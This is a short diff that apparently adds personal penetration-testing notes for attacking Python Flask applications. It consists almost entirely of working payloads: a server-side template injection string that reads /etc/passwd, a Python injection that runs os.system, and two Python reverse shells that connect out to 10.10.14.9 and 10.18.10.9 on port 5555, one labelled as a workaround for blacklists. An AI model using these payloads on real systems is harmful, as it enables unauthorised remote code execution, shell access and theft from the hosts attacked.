@@ -1,0 +1,26 @@
+python -
+
+flask:
+
+triple quote  and {{}} vul to ssti    /vuln?name=`{{ get_user_file("/etc/passwd") }}`
+
+test' + __import__('os').system('pwd'))#
+
+`import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.9",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);`
+
+try this  payload
+
+if blacklist  try this
+
+```
+o = __import__('os')
+s = __import__('socket')
+p = __import__('subprocess')
+
+k=s.socket(s.AF_INET,s.SOCK_STREAM)
+k.connect(("10.18.10.9",5555))
+o.dup2(k.fileno(),0)
+o.dup2(k.fileno(),1)
+o.dup2(k.fileno(),2)
+c=p.call(["/bin/sh","-i"]);
+```
